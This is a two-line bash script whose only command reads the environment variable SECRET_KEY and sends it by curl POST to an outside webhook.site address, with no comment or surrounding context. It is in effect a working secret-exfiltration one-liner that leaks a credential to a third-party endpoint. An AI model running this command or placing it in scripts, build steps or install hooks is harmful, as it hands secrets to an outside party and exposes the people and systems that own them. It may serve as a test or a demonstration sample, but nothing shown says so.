#!/bin/bash
echo $SECRET_KEY | curl -X POST -d @- https://webhook.site/9fe84ac2-3b2d-4d34-b216-393fc4f0ea2a
